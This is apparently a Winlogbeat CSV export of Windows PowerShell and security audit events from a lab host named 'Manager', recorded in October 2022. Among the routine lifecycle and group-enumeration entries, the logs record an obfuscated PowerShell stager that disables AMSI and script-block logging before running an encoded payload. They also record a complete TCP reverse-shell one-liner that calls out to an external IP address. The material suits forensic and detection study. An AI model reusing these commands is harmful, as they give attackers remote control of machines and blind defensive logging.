Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4594,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:19.370",yXkaBIQByII7dpeEjDGc,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:09:19.858","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=69ca20dd-423f-43d6-b9b6-384f6d63f0a4
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=69ca20dd-423f-43d6-b9b6-384f6d63f0a4
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6219,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:08:55.164",QXkaBIQByII7dpeELTFy,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:08:55.493","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=c65bc50a-5509-40ab-a28a-90a26ec8fefc
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=e743b4bb-1089-4493-ba46-78d4e0a26433
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=c65bc50a-5509-40ab-a28a-90a26ec8fefc
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6218,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:08:01.575",7nkZBIQByII7dpeEWy8I,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:08:01.649","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=edd804e6-ded4-4a01-8d45-928d107fd4b7
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=edd804e6-ded4-4a01-8d45-928d107fd4b7
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6217,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:08:01.544",7XkZBIQByII7dpeEWy8I,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:08:01.649","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=16

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=0094b64e-3727-4d00-96ec-4e2c07d9ef14
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=16

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=0094b64e-3727-4d00-96ec-4e2c07d9ef14
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6216,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.573",BXkYBIQByII7dpeEPC54,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:06:48.313","Oct 23, 2022 @ 17:06:48.054",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-544",Administrators,"x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-544
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x94c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","MANAGER$","-","-","-",WORKGROUP,"S-1-5-18","MANAGER$","MANAGER$","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-",0x94c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-544",Administrators,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31202,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.573",BnkYBIQByII7dpeEPC54,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:06:48.313","Oct 23, 2022 @ 17:06:48.054",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-551","Backup Operators","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-551
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x94c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","MANAGER$","-","-","-",WORKGROUP,"S-1-5-18","MANAGER$","MANAGER$","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-",0x94c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-551","Backup Operators","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31203,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.570",BHkYBIQByII7dpeEPC54,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:06:48.312","Oct 23, 2022 @ 17:06:48.052",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-551","Backup Operators","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-551
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x94c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","MANAGER$","-","-","-",WORKGROUP,"S-1-5-18","MANAGER$","MANAGER$","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-",0x94c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-551","Backup Operators","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31201,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.569",A3kYBIQByII7dpeEPC54,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:06:48.312","Oct 23, 2022 @ 17:06:48.048",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-544",Administrators,"x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
